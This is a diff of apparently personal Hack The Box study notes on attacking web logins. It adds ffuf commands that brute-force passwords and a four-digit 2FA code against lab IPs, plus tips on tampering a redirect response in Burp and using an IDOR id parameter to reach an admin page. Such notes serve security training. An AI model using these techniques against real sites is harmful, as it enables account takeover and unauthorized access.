@@ -16,10 +16,15 @@ alakin2504@htb[/htb]$ wc -l custom_wordlist.txt
 ```
 
 ## ffuf
+### Username Enum
 ```
 ffuf -w ./custom_wordlist.txt -u http://94.237.59.98:57232/index.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=admin&password=FUZZ" -fr "Invalid username"
 ```
 
+### Password Enum
+```shell-session
+ffuf -w ./custom_wordlist.txt -u http://94.237.51.67:42649/login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "username=gladys&password=FUZZ" -fr "Invalid credentials"
+```
 
 ## Sequence/OTP
 ```shell-session
@@ -27,7 +32,7 @@ alakin2504@htb[/htb]$ seq -w 0 9999 > tokens.txt
 ```
 
 ```
-ffuf -w ./tokens.txt -u http://83.136.249.227:51338/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=ant0a8oh57n370f08tsuft632h" -d "otp=FUZZ" -fr "Invalid 2FA Code"
+ffuf -w ./tokens.txt -u http:/94.237.52.55:35653/2fa.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -b "PHPSESSID=702kuhgh2p5079h85svk9p8cr4" -d "otp=FUZZ" -fr "Invalid OTP."
 ```
 
 OTP bruteforce
@@ -53,4 +58,18 @@ alakin2504@htb[/htb]$ wc -l city_wordlist.txt
 
 26468 city_wordlist.txt
 ```
+
+## Niche
+### Response
+
+A niche technique is to use Burp to intercept response.
+
+Some application will send back 302 when accessing authorized-only endpoints without a session
+
+We can intercept response to change to 200
+
+### IDOR
+Some app needs to have valid user_id in param to go to auth page like /admin.php?id=356
+
+without id, it redirects to login
 
